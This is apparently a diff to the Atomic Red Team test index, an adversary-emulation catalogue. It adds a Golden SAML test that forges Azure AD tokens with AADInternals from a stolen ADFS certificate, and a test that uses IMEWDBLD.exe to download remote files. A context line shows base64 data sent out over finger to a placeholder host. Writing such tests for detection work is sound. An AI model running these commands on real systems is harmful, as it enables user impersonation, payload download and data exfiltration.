@@ -5742,7 +5742,49 @@ credential-access:
       - Windows
       - Office 365
       - Google Workspace
-    atomic_tests: []
+      identifier: T1606.002
+    atomic_tests:
+    - name: Golden SAML
+      auto_generated_guid: b16a03bc-1089-4dcc-ad98-30fe8f3a2b31
+      description: "Forge a \"Golden SAML\" token which allows to impersonate any
+        Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need
+        the ADFS token signing certificate (see T1552.004 to export it).\nMore info
+        here : https://o365blog.com/post/adfs/\n"
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        certificate_path:
+          description: Token signing certificate path. See T1552.004 to export it
+          type: Path
+          default: ".\\ADFS_signing.pfx"
+        immutable_id:
+          description: ImmutableId of the targeted user. It can be obtained with AzureAD
+            powershell module; $(Get-AzureADUser -SearchString "username").ImmutableId
+          type: String
+          default: aehgdqBTZV50DKQZmNJ8mg==
+        issuer_uri:
+          description: Issuer URI of the ADFS service
+          type: String
+          default: http://contoso.com/adfs/services/trust/
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AADInternals) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: |
+          Import-Module AADInternals -Force
+          $saml = New-AADIntSAMLToken -ImmutableID "#{immutable_id}" -PfxFileName "#{certificate_path}" -Issuer "#{issuer_uri}"
+          $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
+          if ($conn) { Write-Host "`nSuccessfully connected as $($conn.User)" } else { Write-Host "`nThe connection failed" }
+          Write-Host "End of Golden SAML"
+        name: powershell
   T1003.002:
     technique:
       external_references:
@@ -67160,6 +67202,32 @@ command-and-control:
         command: 'finger base64_filedata@#{remote_host}
 
 '
+    - name: Download a file with IMEWDBLD.exe
+      auto_generated_guid: 1a02df58-09af-4064-a765-0babe1a0d1e2
+      description: |
+        Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
+        Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
+        Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_url:
+          description: Location of file to be downloaded.
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
+        file_name:
+          description: Name of the file to be downloaded without extension.
+          type: string
+          default: T1105
+      executor:
+        command: |
+          $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
+          & $imewdbled #{remote_url}
+        cleanup_command: "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\"
+          \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include
+          #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\ncmd.exe
+          /c \"del $file_to_be_removed\"\n"
+        name: powershell
   T1090.001:
     technique:
       external_references:
